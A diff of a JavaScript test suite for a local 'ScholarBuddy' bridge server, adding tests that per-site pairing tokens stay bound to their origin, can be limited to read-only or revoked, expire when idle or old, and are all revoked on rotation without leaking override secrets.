-      await assert.rejects(ensureBridgeToken({}, file), /token is invalid/);
-      await assert.rejects(
-        ensureBridgeToken({ WORKBUDDY_BRIDGE_TOKEN: invalid }, file),
-        /token is invalid/,
-      );
+    assert.ok(!(await readFile(file, "utf8")).includes(token));
+    const reopened = await openGrantStore(file);
+    assert.equal(reopened.verify(allowedOrigin, token)?.origin, allowedOrigin);
+    // A list that cannot be read trusts nobody rather than everybody.
+    await writeFile(file, "{not json");
+    assert.equal((await openGrantStore(file)).verify(allowedOrigin, token), null);
+    for (const invalid of ["", "short", " ".repeat(40)])
       assert.equal(
         authorize(
           new Request("http://127.0.0.1/health", {
-            headers: { Origin: allowedOrigin },
+            headers: { Origin: allowedOrigin, Authorization: `Bearer ${invalid}` },
           }),
           { ...config(directory), _bridgeToken: invalid },
         ).status,
         401,
       );
+  } finally {
+    await rm(directory, { recursive: true, force: true });
+  }
+});
+
+function perSite(vault, store) {
+  return {
+    ...config(vault),
+    SCHOLARBUDDY_ORIGINS: `${allowedOrigin},https://backup.example`,
+    _bridgeToken: undefined,
+    _grants: store,
+  };
+}
+const bridgeCall = (settings, origin, token, pathname = "/health", init = {}) =>
+  handle(
+    new Request(`http://127.0.0.1:32145${pathname}`, {
+      ...init,
+      headers: {
+        Origin: origin,
+        ...(token ? { Authorization: `Bearer ${token}` } : {}),
+        ...(init.headers || {}),
+      },
+    }),
+    settings,
+  );
+const jsonBody = (method, body) => ({
+  method,
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify(body),
+});
+async function setupSession(settings) {
+  const page = await handle(new Request("http://127.0.0.1:32145/setup"), settings);
+  const session = (await page.text()).match(/"session":"([A-Za-z0-9_-]+)"/)[1];
+  return (pathname, init = {}) =>
+    handle(
+      new Request(`http://127.0.0.1:32145${pathname}`, {
+        ...init,
+        headers: { "X-ScholarBuddy-Setup": session, ...(init.headers || {}) },
+      }),
+      settings,
+    );
+}
+
+test("each site pairs for its own credential, which no other origin can use", async () => {
+  const directory = await mkdtemp(path.join(os.tmpdir(), "scholarbuddy-grants-"));
+  try {
+    const store = createGrantStore(path.join(directory, "grants.json"));
+    await store.load();
+    const settings = perSite(directory, store);
+    const page = await handle(new Request("http://127.0.0.1:32145/pair"), settings);
+    const code = (await page.text()).match(/<code id="token">([^<]+)</)[1];
+    const first = await bridgeCall(
+      settings,
+      allowedOrigin,
+      "",
+      "/pair/exchange",
+      jsonBody("POST", { code }),
+    );
+    assert.equal(first.status, 200);
+    const { token } = await first.json();
+    assert.equal((await bridgeCall(settings, allowedOrigin, token)).status, 200);
+    // The same credential presented from another allowed site is just a stranger.
+    const elsewhere = await bridgeCall(settings, "https://backup.example", token);
+    assert.equal(elsewhere.status, 401);
+    assert.equal((await elsewhere.json()).code, "pairing_required");
+    assert.deepEqual(
+      store.list().map((grant) => [grant.origin, grant.access]),
+      [[allowedOrigin, "full"]],
+    );
+
+    // A code minted for the setup page's return trip only works where it was sent.
+    const setup = await setupSession(settings);
+    const returnTrip = async () =>
+      new URL(
+        (
+          await (
+            await setup("/setup/pair", jsonBody("POST", { returnOrigin: "https://backup.example" }))
+          ).json()
+        ).url,
+      );
+    const stolen = new URLSearchParams((await returnTrip()).hash.slice(1)).get("bridge-pair");
+    assert.equal(
+      (
+        await bridgeCall(
+          settings,
+          allowedOrigin,
+          "",
+          "/pair/exchange",
+          jsonBody("POST", { code: stolen }),
+        )
+      ).status,
+      401,
+    );
+    const destination = await returnTrip();
+    assert.equal(destination.origin, "https://backup.example");
+    const second = await bridgeCall(
+      settings,
+      "https://backup.example",
+      "",
+      "/pair/exchange",
+      jsonBody("POST", { code: new URLSearchParams(destination.hash.slice(1)).get("bridge-pair") }),
+    );
+    assert.equal(second.status, 200);
+    assert.notEqual((await second.json()).token, token);
+  } finally {
+    await rm(directory, { recursive: true, force: true });
+  }
+});
+
+test("a paired site can be limited to reading, revoked from setup, and can disconnect itself", async () => {
+  const directory = await mkdtemp(path.join(os.tmpdir(), "scholarbuddy-grants-"));
+  try {
+    const store = createGrantStore(path.join(directory, "grants.json"));
+    await store.load();
+    const settings = perSite(directory, store);
+    const token = await store.issue(allowedOrigin);
+    const backup = await store.issue("https://backup.example");
+    const save = () =>
+      bridgeCall(
+        settings,
+        allowedOrigin,
+        token,
+        "/workbench/record",
+        jsonBody("POST", { collection: "ideas", record: { title: "An idea" } }),
+      );
+    assert.equal((await save()).status, 201);
+
+    // The list is for the person at this Mac, not for a paired site.
+    assert.equal(
+      (await handle(new Request("http://127.0.0.1:32145/setup/grants"), settings)).status,
+      401,
+    );
+    const setup = await setupSession(settings);
+    const listed = await (await setup("/setup/grants")).json();
+    assert.equal(listed.perSite, true);
+    assert.equal(listed.grants.length, 2);
+    assert.ok(!JSON.stringify(listed).includes(token));
+    const id = (origin) => listed.grants.find((grant) => grant.origin === origin).id;
+
+    await setup("/setup/grants", jsonBody("POST", { id: id(allowedOrigin), access: "read" }));
+    const refused = await save();
+    assert.equal(refused.status, 403);
+    assert.equal((await refused.json()).code, "read_only");
+    assert.equal(
+      (await bridgeCall(settings, allowedOrigin, token, "/workbench/state")).status,
+      200,
+    );
+    assert.equal(
+      (
+        await bridgeCall(
+          settings,
+          allowedOrigin,
+          token,
+          "/calendar/event",
+          jsonBody("DELETE", { id: "evt" }),
+        )
+      ).status,
+      403,
+    );
+
+    // Pairing again does not lift the limit, and the browser's old credential is
+    // traded in rather than left alive beside the new one.
+    const page = await handle(new Request("http://127.0.0.1:32145/pair"), settings);
+    const code = (await page.text()).match(/<code id="token">([^<]+)</)[1];
+    const again = await bridgeCall(
+      settings,
+      allowedOrigin,
+      token,
+      "/pair/exchange",
+      jsonBody("POST", { code }),
+    );
+    const renewed = (await again.json()).token;
+    assert.notEqual(renewed, token);
+    assert.equal(store.verify(allowedOrigin, token), null);
+    assert.equal(store.verify(allowedOrigin, renewed)?.access, "read");
+    assert.equal(store.list().filter((grant) => grant.origin === allowedOrigin).length, 1);
+    await setup(
+      "/setup/grants",
+      jsonBody("POST", { id: store.verify(allowedOrigin, renewed).id, access: "read" }),
+    );
+
+    // Read-only still lets the site give its credential back.
+    const revoked = await bridgeCall(settings, allowedOrigin, renewed, "/pair/revoke", {
+      method: "POST",
+    });
+    assert.deepEqual(await revoked.json(), { revoked: true });
+    assert.equal((await bridgeCall(settings, allowedOrigin, renewed)).status, 401);
+
+    assert.equal((await bridgeCall(settings, "https://backup.example", backup)).status, 200);
+    await setup("/setup/grants", jsonBody("DELETE", { id: id("https://backup.example") }));
+    assert.equal((await bridgeCall(settings, "https://backup.example", backup)).status, 401);
+    await assert.rejects(
+      setup("/setup/grants", jsonBody("DELETE", { id: "missing" })),
+      (error) => error.status === 404,
+    );
+  } finally {
+    await rm(directory, { recursive: true, force: true });
+  }
+});
+
+test("paired access lapses when it goes unused or simply gets old", async () => {
+  const directory = await mkdtemp(path.join(os.tmpdir(), "scholarbuddy-grants-"));
+  const DAY = 86_400_000;
+  try {
+    let now = Date.UTC(2026, 0, 1);
+    const file = path.join(directory, "grants.json");
+    const store = createGrantStore(file, { clock: () => now });
+    await store.load();
+
+    const idle = await store.issue(allowedOrigin);
+    now += GRANT_IDLE_MS - DAY;
+    assert.ok(store.verify(allowedOrigin, idle), "used within the idle window");
+    now += GRANT_IDLE_MS + DAY;
+    assert.equal(store.verify(allowedOrigin, idle), null, "left unused past the idle window");
+
+    const busy = await store.issue(allowedOrigin);
+    const issued = now;
+    while (now + 7 * DAY < issued + GRANT_MAX_AGE_MS) {
+      now += 7 * DAY;
+      assert.ok(store.verify(allowedOrigin, busy), "in weekly use");
     }
+    now = issued + GRANT_MAX_AGE_MS + 1;
+    assert.equal(store.verify(allowedOrigin, busy), null, "too old however often it is used");
+
+    await store.flush();
   } finally {
     await rm(directory, { recursive: true, force: true });
   }
@@ -2560,25 +3192,39 @@ test("provider diagnostics redact exact opaque credentials in messages and codes
   }
 });
 
-test("token rotation refuses overrides and preserves the existing token file", async () => {
+test("token rotation refuses a fixed token and otherwise revokes every paired browser", async () => {
   const directory = await mkdtemp(path.join(os.tmpdir(), "scholarbuddy-rotation-"));
-  const file = path.join(directory, "token");
+  const file = path.join(directory, "grants.json");
   try {
-    await writeFile(file, "old-token\n");
+    const store = createGrantStore(file);
+    await store.load();
+    const token = await store.issue(allowedOrigin);
     for (const override of ["", "fixed-credential-that-must-not-be-logged"]) {
       await assert.rejects(
-        rotateBridgeToken({ WORKBUDDY_BRIDGE_TOKEN: override }, file),
+        rotateBridgeToken({ SCHOLARBUDDY_BRIDGE_TOKEN: override }, file),
         (error) => {
-          assert.match(error.message, /WORKBUDDY_BRIDGE_TOKEN overrides/);
+          assert.match(error.message, /SCHOLARBUDDY_BRIDGE_TOKEN overrides/);
           if (override) assert.ok(!error.message.includes(override));
           return true;
         },
       );
-      assert.equal(await readFile(file, "utf8"), "old-token\n");
+      const kept = createGrantStore(file);
+      await kept.load();
+      assert.ok(kept.verify(allowedOrigin, token), "a refused rotation revokes nobody");
     }
-    const rotated = await rotateBridgeToken({}, file);
-    assert.ok(rotated.length >= 32);
-    assert.equal(await readFile(file, "utf8"), `${rotated}\n`);
+    await rotateBridgeToken({}, file);
+    // A Bridge that was running through the rotation still holds the old list in
+    // memory. Its next write must not put the revoked browsers back. (A pairing in
+    // the very millisecond of the revocation is revoked with the rest.)
+    await new Promise((resolve) => setTimeout(resolve, 5));
+    const later = await store.issue("https://backup.example");
+    assert.equal(store.verify(allowedOrigin, token), null);
+    assert.ok(store.verify("https://backup.example", later));
+    await rotateBridgeToken({}, file);
+    const after = createGrantStore(file);
+    await after.load();
+    assert.equal(after.verify(allowedOrigin, token), null);
+    assert.deepEqual(after.list(), []);
     assert.equal((await stat(file)).mode & 0o777, 0o600);
   } finally {
     await rm(directory, { recursive: true, force: true });
@@ -2596,17 +3242,20 @@ test("rotation CLI detects overrides from both env file and process environment"
       for (const name of (await readdir(source)).filter((name) => name.endsWith(".mjs")))
         await writeFile(path.join(directory, folder, name), await readFile(new URL(name, source)));
     }
-    const file = path.join(directory, "bridge", ".workbuddy-token");
-    await writeFile(file, "existing-token\n");
+    const file = path.join(directory, "bridge", ".scholarbuddy-grants.json");
+    const store = createGrantStore(file);
+    await store.load();
+    await store.issue(allowedOrigin);
+    const paired = await readFile(file, "utf8");
     for (const fromFile of [true, false]) {
       const secret = "override-value-must-not-appear-in-output";
       await writeFile(
         path.join(directory, ".env.local"),
-        fromFile ? `WORKBUDDY_BRIDGE_TOKEN=${secret}\n` : "",
+        fromFile ? `SCHOLARBUDDY_BRIDGE_TOKEN=${secret}\n` : "",
       );
       const env = { ...process.env };
-      delete env.WORKBUDDY_BRIDGE_TOKEN;
-      if (!fromFile) env.WORKBUDDY_BRIDGE_TOKEN = secret;
+      delete env.SCHOLARBUDDY_BRIDGE_TOKEN;
+      if (!fromFile) env.SCHOLARBUDDY_BRIDGE_TOKEN = secret;
       await assert.rejects(
         promisify(execFile)(
           process.execPath,
@@ -2614,13 +3263,13 @@ test("rotation CLI detects overrides from both env file and process environment"
           { env },
         ),
         (error) => {
-          assert.match(error.stderr, /WORKBUDDY_BRIDGE_TOKEN overrides/);
+          assert.match(error.stderr, /SCHOLARBUDDY_BRIDGE_TOKEN overrides/);
           assert.ok(!error.stderr.includes(secret));
           assert.doesNotMatch(error.stdout, /token rotated/i);
           return true;
         },
       );
-      assert.equal(await readFile(file, "utf8"), "existing-token\n");
+      assert.equal(await readFile(file, "utf8"), paired);
     }
   } finally {
     await rm(directory, { recursive: true, force: true });
